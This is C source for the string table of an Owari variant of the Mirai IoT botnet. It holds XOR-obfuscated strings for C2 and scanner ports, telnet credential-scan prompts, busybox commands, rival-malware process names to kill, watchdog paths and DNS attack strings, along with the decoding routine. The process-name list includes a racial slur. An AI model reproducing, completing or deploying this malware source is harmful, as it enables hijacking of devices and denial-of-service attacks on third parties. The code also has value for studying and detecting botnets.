#define _GNU_SOURCE

#ifdef DEBUG
    #include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0x1337c0d3;
struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x22\x84", 2); // 5555
    add_entry(TABLE_SCAN_CB_PORT, "\x75\x43", 2); // 17012
    add_entry(TABLE_EXEC_SUCCESS, "\x7E\x59\x51\x52\x54\x43\x52\x53\x18\x75\x4E\x18\x78\x40\x56\x45\x5E\x37", 18); // Infected By Owari

    add_entry(TABLE_SCAN_SHELL, "\x44\x5F\x52\x5B\x5B\x37", 6); // shell
    add_entry(TABLE_SCAN_ENABLE, "\x52\x59\x56\x55\x5B\x52\x37", 7); // enable
    add_entry(TABLE_SCAN_SYSTEM, "\x44\x4E\x44\x43\x52\x5A\x37", 7); // system
    add_entry(TABLE_SCAN_SH, "\x64\x7F\x37", 3); // sh
    add_entry(TABLE_SCAN_QUERY, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x18\x78\x60\x76\x65\x7E\x37", 19); // /bin/busybox OWARI
    add_entry(TABLE_SCAN_RESP, "\x78\x60\x76\x65\x7E\x0D\x18\x56\x47\x47\x5B\x52\x43\x18\x59\x58\x43\x18\x51\x58\x42\x59\x53\x37", 24); // OWARI: applet not found
    add_entry(TABLE_SCAN_NCORRECT, "\x59\x54\x58\x45\x45\x52\x54\x43\x37", 9); // ncorrect
    add_entry(TABLE_SCAN_PS, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x47\x44\x37", 16); // /bin/busybox ps
    add_entry(TABLE_SCAN_KILL_9, "\x18\x55\x5E\x59\x18\x55\x42\x44\x4E\x55\x58\x4F\x17\x5C\x5E\x5B\x5B\x17\x1A\x0E\x37", 22); // /bin/busybox kill -9
    add_entry(TABLE_SCAN_OGIN, "\x58\x50\x5E\x59\x37", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x52\x59\x43\x52\x45\x37", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x56\x44\x44\x40\x58\x45\x53\x37", 8); // assword
	
    add_entry(TABLE_KILLER_PROC, "\x18\x47\x45\x58\x54\x18\x37", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x18\x52\x4F\x52\x37", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x18\x51\x53\x37", 4); // /fd
    add_entry(TABLE_KILLER_MAPS, "\x18\x5A\x56\x47\x44\x37", 6); // /maps
    add_entry(TABLE_KILLER_TCP, "\x18\x47\x45\x58\x54\x18\x59\x52\x43\x18\x43\x54\x47\x37", 14); // /proc/net/tcp

    add_entry(TABLE_EXEC_MIRAI, "\x53\x41\x45\x7F\x52\x5B\x47\x52\x45\x37", 10); // dvrHelper
    add_entry(TABLE_EXEC_SORA1, "\x79\x5E\x70\x70\x52\x65\x01\x0E\x4F\x53\x37", 11); // NiGGeR69xd
    add_entry(TABLE_EXEC_SORA2, "\x06\x04\x04\x00\x64\x58\x45\x56\x7B\x78\x76\x73\x72\x65\x37", 15); // 1337SoraLOADER
    add_entry(TABLE_EXEC_OWARI, "\x6F\x06\x0E\x7E\x05\x04\x0E\x06\x05\x03\x62\x7E\x62\x37", 14); // X19I239124UIU
    add_entry(TABLE_EXEC_JOSHO, "\x06\x03\x71\x56\x37", 5); // 14Fa
    add_entry(TABLE_EXEC_APOLLO, "\x54\x54\x76\x73\x37", 5); // ccAD
	add_entry(TABLE_EXEC_KATRINA, "\x7C\x56\x43\x45\x5E\x59\x56\x04\x05\x37", 10); // Katrina32
	add_entry(TABLE_EXEC_GALAXY, "\x64\x74\x76\x79\x79\x72\x65\x37", 8); // SCANNER
	add_entry(TABLE_EXEC_JOSHO3, "\x60\x44\x70\x76\x03\x77\x71\x01\x71\x37", 10); // WsGA4@F6F
	add_entry(TABLE_EXEC_MASUTA, "\x47\x58\x5E\x5B\x5C\x5D\x5A\x59\x55\x37", 10); // poilkjmnb
	add_entry(TABLE_EXEC_DADDYLEET, "\x76\x55\x76\x53\x37", 5); // AbAd
	add_entry(TABLE_EXEC_ALLQBOT, "\x12\x44\x18\x12\x44\x18\x7F\x63\x63\x67\x37", 11); // %s %s HTTP
	add_entry(TABLE_EXEC_QBOT, "\x7B\x78\x7B\x79\x78\x70\x63\x71\x78\x37", 10); // LOLNOGTFO
	add_entry(TABLE_EXEC_OGOWARI, "\x7E\x42\x6E\x50\x42\x5D\x52\x7E\x46\x59\x37", 11); // IuYgujeIqn

    add_entry(TABLE_IOCTL_KEEPALIVE1, "\x18\x53\x52\x41\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 14); // /dev/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE2, "\x18\x53\x52\x41\x18\x5A\x5E\x44\x54\x18\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 19); // /dev/misc/watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE3, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x68\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 23); // /dev/FTWDT101_watchdog
    add_entry(TABLE_IOCTL_KEEPALIVE4, "\x18\x53\x52\x41\x18\x71\x63\x60\x73\x63\x06\x07\x06\x6B\x17\x40\x56\x43\x54\x5F\x53\x58\x50\x37", 24); // /dev/FTWDT101\ watchdog
	
    add_entry(TABLE_RANDOM, "\x4D\x71\x71\x64\x0E\x4E\x55\x59\x07\x74\x54\x5A\x56\x01\x59\x74\x7A\x0E\x05\x60\x5F\x7B\x6D\x7E\x40\x50\x76\x5A\x6D\x43\x7F\x0F\x46\x60\x4D\x06\x41\x41\x63\x70\x7D\x7F\x7D\x43\x72\x62\x04\x5B\x73\x0F\x00\x54\x7E\x61\x6F\x65\x01\x7A\x7A\x0E\x5A\x07\x0F\x67\x37", 65); // zFFS9ybn0Ccma6nCM92WhLZIwgAmZtH8qWz1vvTGJHJtEU3lD87cIVXR6MM9m08P
	
	add_entry(TABLE_ATK_VSE, "\x63\x64\x58\x42\x45\x54\x52\x17\x72\x59\x50\x5E\x59\x52\x17\x66\x42\x52\x45\x4E\x37", 21); // TSource Engine Query
    add_entry(TABLE_ATK_RESOLVER, "\x18\x52\x43\x54\x18\x45\x52\x44\x58\x5B\x41\x19\x54\x58\x59\x51\x37", 17); // /etc/resolv.conf
    add_entry(TABLE_ATK_NSERV, "\x59\x56\x5A\x52\x44\x52\x45\x41\x52\x45\x37", 11); // nameserver
}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(!val->locked)
        {
            printf("[table] Tried to double-unlock value %d\n", id);
            return;
        }
    #endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to double-lock value\n");
            return;
        }
    #endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

    #ifdef DEBUG
        if(val->locked)
        {
            printf("[table] Tried to access table.%d but it is locked\n", id);
            return NULL;
        }
    #endif

    if(len != NULL)
        *len = (int)val->val_len;

    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;

    #ifdef DEBUG
        table[id].locked = TRUE;
    #endif
}

static void toggle_obf(uint8_t id)
{
    int i = 0;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for(i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

    #ifdef DEBUG
        val->locked = !val->locked;
    #endif
}

